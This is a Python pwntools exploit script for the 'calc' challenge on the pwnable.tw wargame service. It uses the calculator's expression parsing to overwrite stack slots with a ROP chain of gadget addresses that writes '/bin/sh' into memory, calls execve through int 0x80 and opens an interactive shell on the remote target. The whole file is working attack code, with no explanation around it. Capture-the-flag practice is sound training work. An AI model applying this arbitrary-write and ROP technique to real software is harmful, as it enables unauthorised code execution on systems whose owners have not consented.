from pwn import*
import argparse

context(arch='i386',os='linux')
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']

parser = argparse.ArgumentParser()
parser.add_argument('-r','--remote',action='store_true',help='-r -> remote')

args = parser.parse_args()

host = 'chall.pwnable.tw'
port = 10100

if args.remote:
    r = remote(host,port)
else:
    r = process('./calc')
    gdb.attach(r)

binsh = 0x080ee360
_bin = 0x6e69622f
_sh  = 0x0068732f
pop_eax = 0x0805c34b            #pop eax; ret
pop_ecx_ebx = 0x080701d1        #pop ecx; pop ebx; ret
pop_edx = 0x080701aa            #pop edx; ret
write_ecx = 0x080958c2          #add [ecx]; eax; ret
int80 = 0x08070880              #int 0x80; ret

def insert(idx,data):
    show = '+' + str(idx)
    r.sendline(show)
    origin = int(r.recvline())
    if(origin < 0):
        origin *= -1

    payload = show
    payload += '+' + str(int(data))
    payload += '-' + str(origin)
    r.sendline(payload)
    print(payload)
    r.recv(1024)

r.recvuntil('=\n')
insert(361, pop_eax)
insert(362, _bin)
insert(363, pop_ecx_ebx)
insert(364, binsh)
insert(365, binsh)
insert(366, write_ecx)
insert(367, pop_eax)
insert(368, _sh)
insert(369, pop_ecx_ebx)
insert(370, binsh+4)
insert(371, binsh+4)
insert(372, write_ecx)
insert(373, pop_eax)
insert(374, 0xb)
insert(375, pop_ecx_ebx)
insert(376, binsh+8)
insert(377, binsh)
insert(378, pop_edx)
insert(379, binsh+8)
insert(380, int80)

r.sendline("")

r.interactive()
